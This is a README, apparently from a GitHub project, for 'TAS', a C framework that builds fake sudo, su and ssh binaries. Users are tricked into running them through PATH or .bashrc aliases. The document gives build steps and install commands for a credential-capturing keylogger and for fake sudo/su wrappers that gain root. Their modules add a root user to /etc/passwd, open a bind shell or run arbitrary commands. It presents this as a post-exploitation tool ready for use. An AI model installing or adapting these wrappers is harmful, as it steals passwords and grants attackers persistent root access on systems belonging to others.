TAS
===

A tiny framework for easily manipulate the tty and create fake binaries.

How it works?
-------------

The framework has three main functions, tas_execv, tas_forkpty, and tas_tty_loop.

* **tas_execv:** It is a function similar to execv, but it doesn't re-execute the current binary, something very useful for creating fake binaries.

* **tas_forkpty:** Is the same as forkpty, but it fills a custom structure, check forkpty man page for more details.

* **tas_tty_loop:** here is where the manipulation of the tty happen, you can set a hook function for the input and output, so it is possible to store the keys typed by the user or manipulate the terminal output. (see [leet-shell](#leet-shell)).

This is a superficial overview, check the codes in tas/fakebins/fun folders to understand how it really works.

Fakebins
--------

Through manipulation of the PATH environment variable, or by using bash's aliases (or any other shell that supports aliases), you can run another program instead of the program that the user usually runs. This makes it possible to capture keystrokes and modify the command line to change the original program behavior.

Change the command line of some programs, like sudo and su, can lead to privilege escalation.

I'd created three programs as an example of what you can do with the framework: **sudo**, **su** and **generic-keylogger**.

### generic-keylogger

The **generic-keylogger**, as the name suggests, is a binary that acts like a keylogger, the main idea is to use it to get passwords of programs like ssh, mysql, etc.

### sudo/su

It can be used as a keylogger, or you can run some of the [modules](#modules) as root, by manipulating the command line.

#### Step-by-step cmd change:

The user types ```sudo cmd```  
```fakesudo cmd``` runs  
The fakesudo executes ```sudo fakesudo cmd```

After it is running as root, the fakesudo create a child process for executing some of the modules, and in the main PID, it runs the original command.

> **Note:** fakesudo only changes the command if the user runs ```sudo cmd [args]```, if some additional flags are used, then the command isn't touched.

Almost the same process happens with the **su**:

The user types ```su -```  
```fakesu -``` runs  
The fakesu executes ```su - -c fakesu```

After it is running as root, the fakesu create a child process for executing some of the modules, and in the main PID, it runs ```bash -i```

> **Note:** fakesu only changes the command if the user runs ```su``` or ```su -```, if some additional flags are used, then the command isn't touched.

Modules
-------

For now, there are only three modules:

* *add-root-user* - creates a root user with password in /etc/passwd.
* *bind-shell* - listen for incoming connections and spawn a tty shell.
* *system* - executes a command as root.

I can add more modules in the future, but if you are familiar with the C language, I believe that it is not very difficult to change the programs to run what you want as root, just modify a few lines of code and change the ```super()``` function.

Building
--------

First, build the base library:

```shell
$ make
  CC .obj/globals.o
  CC .obj/getinode.o
  CC .obj/tas-execv.o
  CC .obj/tty.o
  CC .obj/xreadlink.o
  AR .obj/libtas.a
```

After that, you can build **generic-keylogger**, **sudo** or **su**, by running ```make [target-bin]```

**Example:**

```shell
$ make su
make[1]: Entering directory '/home/test/tas/fakebins/su'
[+] configuring fakesu ...
enable keylogger? [y/N] y
number of lines to record [empty = store all]:
logfile (default: /tmp/.keys.txt):
use some FUN modules? [y/N] n
[+] configuration file created in /home/test/tas/fakebins/su/config.h
  CC su
make[1]: Leaving directory '/home/test/tas/fakebins/su'
```

Examples
--------
### Creating a fakessh:

**Compile:**
```shell
$ make generic-keylogger
make[1]: Entering directory '/home/test/tas/fakebins/generic-keylogger'
[+] configuring generic-keylogger ...
number of lines to record [empty = store all]: 3
logfile (default: /tmp/.keys.txt):
[+] configuration file created in /home/test/tas/fakebins/generic-keylogger/config.h
  CC generic-keylogger
make[1]: Leaving directory '/home/test/tas/fakebins/generic-keylogger'
```

**Install:**
```shell
$ mkdir ~/.bin
$ cp generic-keylogger ~/.bin/ssh
$ echo "alias ssh='$HOME/.bin/ssh'" >> ~/.bashrc
```

**In action:**

![Demo](https://raw.githubusercontent.com/hc0d3r/tas/media/generic-keylogger.gif)

### Using the bind-shell module

**Compile:**
```shell
make[1]: Entering directory '/home/test/tas/fakebins/sudo'
[+] configuring fakesudo ...
enable keylogger? [y/N] n
use some FUN modules? [y/N] y
[1] add-root-user
[2] bind-shell
[3] system
[4] cancel
> 2
listen port (Default: 1337): 5992
[+] configuration file created in /home/test/tas/fakebins/sudo/config.h
  CC sudo
make[1]: Leaving directory '/home/test/tas/fakebins/sudo'
```

**Install:**

```shell
$ cp sudo ~/.sudo
$ echo "alias sudo='$HOME/.sudo'" >> ~/.bashrc
```

**In action:**

![Demo](https://raw.githubusercontent.com/hc0d3r/tas/media/fakesudo.gif)

leet-shell
----------
leet-shell is an example of how you can manipulate the tty output, it allows you to use the bash like a 1337 h4x0r.

```shell
[test@alfheim tas]$ make fun/leet-shell
  CC fun/leet-shell
[t3st@alfheim tas]$ fun/leet-shell
SP4WN1NG L33T SH3LL H3R3 !!!
[t3st@4lfh31m t4s]$ 3ch0 'l33t sh3ll 1s l33t !!!'
l33t sh3ll 1s l33t !!!
```

Notes
-----
Somethings can make the fake-programs not work as expected:

* whitelisted sudo commands.
* /proc/ unvaliable (/proc/self/exe is used to obtain the binary fullname).

The sudo will always ask for the password when the keylogger function is used in the fakesudo.

**How to protect yourself?**  
This is a post-exploitation technique to performs privilege escalation and information gathering, if you want to protect yourself, not be invaded is a good way to start...

Contributing
------------
You can help with code, or donating money.
If you wanna help with code, use the kernel code style as a reference.

Paypal: [![](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=RAG26EKAYHQSY&currency_code=BRL&source=url)

BTC: 1PpbrY6j1HNPF7fS2LhG9SF2wtyK98GSwq
